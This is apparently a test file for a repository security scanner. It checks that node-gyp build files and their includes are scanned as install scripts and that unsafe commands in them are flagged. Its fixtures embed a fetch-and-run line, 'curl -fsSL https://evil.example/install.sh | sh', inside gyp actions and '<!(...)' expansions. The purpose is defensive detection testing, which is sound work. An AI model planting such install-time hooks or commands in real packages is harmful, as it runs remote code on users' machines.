import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function encode(text: string): Uint8Array {
  return new TextEncoder().encode(text);
}

function inspected(files: { path: string; text: string }[]) {
  return inspectRepository({
    files: files.map((file) => ({ path: file.path, bytes: encode(file.text) })),
  });
}

test("node-gyp definitions are install scripts, including a benign npm install hook", () => {
  // PRD section 8: the scan checks install and build scripts. node-gyp loads
  // binding.gyp during `node-gyp rebuild` and runs its actions. An npm
  // install script that only says `node-gyp rebuild` does not contain the
  // command those actions run.
  for (const path of [
    "binding.gyp",
    "Native/Binding.GYP",
    "deps/common.gypi",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  const scan = (gyp: string) =>
    inspected([
      {
        path: "package.json",
        text: JSON.stringify({
          name: "native-addon",
          scripts: { install: "node-gyp rebuild" },
        }),
      },
      { path: "binding.gyp", text: gyp },
    ]);
  const before = scan(`{
    "targets": [{ "target_name": "addon", "sources": ["src/addon.cc"] }]
  }`);
  const after = scan(`{
    "targets": [{
      "target_name": "addon",
      "sources": ["src/addon.cc"],
      "actions": [{
        "action_name": "fetch",
        "inputs": [],
        "outputs": ["fetched.txt"],
        "action": ["sh", "-c", "${PAYLOAD}"]
      }]
    }]
  }`);
  expect(before.findings).toEqual([]);
  expect(before.downloads).toEqual([]);
  expect(before.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "binding.gyp",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.visibilityGaps).toContain(
    "Install-time download not retrieved: https://evil.example/install.sh",
  );
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("a GYP includes entry is scanned under the included file's real name", () => {
  // Includes are relative to the file that names them, and a nested include
  // may use any suffix. `<!(...)` runs in a shell when gyp loads the file.
  const scan = (command: string) =>
    inspected([
      {
        path: "binding.gyp",
        text: `{\n  'includes': [\n    'deps/a.inc',\n  ],\n}\n`,
      },
      {
        path: "deps/a.inc",
        text: `{\n  'includes': [\n    'b.inc',\n  ],\n}\n`,
      },
      {
        path: "deps/b.inc",
        text: `{\n  'variables': {\n    'fetched': '<!(${command})',\n  },\n}\n`,
      },
      {
        path: "pkg/native/binding.gyp",
        text: `{\n  'includes': [\n    '../../deps/fetch.txt',\n  ],\n}\n`,
      },
      {
        path: "deps/fetch.txt",
        text: `{\n  'variables': { 'x': '<!(${command})' },\n}\n`,
      },
    ]);
  const before = scan("echo safe");
  const after = scan(PAYLOAD);
  expect(after.coverage.installScripts).toEqual({
    state: "complete",
    items: 5,
  });
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "deps/b.inc",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.findings).toContainEqual(
    expect.objectContaining({
      path: "deps/fetch.txt",
      category: "unsafe-execution",
      severity: "high",
    }),
  );
  expect(after.downloads).toContain("https://evil.example/install.sh");
  expect(after.inventorySha256).not.toBe(before.inventorySha256);
});

test("GYP includes do not adopt files outside the repository or ordinary prose", () => {
  const inspection = inspected([
    {
      path: "binding.gyp",
      text: `{
        'includes': [
          '../payload.txt',
          '/tmp/payload.txt',
          'https://evil.example/payload.txt',
        ],
        'targets': [{
          'target_name': 'addon',
          'sources': ['src/addon.cc'],
          'note': "see includes: [ 'notes.txt' ]"
        }]
      }`,
    },
    { path: "payload.txt", text: `${PAYLOAD}\n` },
    { path: "notes.txt", text: `${PAYLOAD}\n` },
  ]);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(surfacesOf("binding.gyp.bak")).toEqual([]);
  expect(surfacesOf("notes.gyp.txt")).toEqual([]);
  expect(surfacesOf("dir.gyp/addon.c")).toEqual(["source"]);
  expect(surfacesOf("LICENSE")).toEqual([]);
});
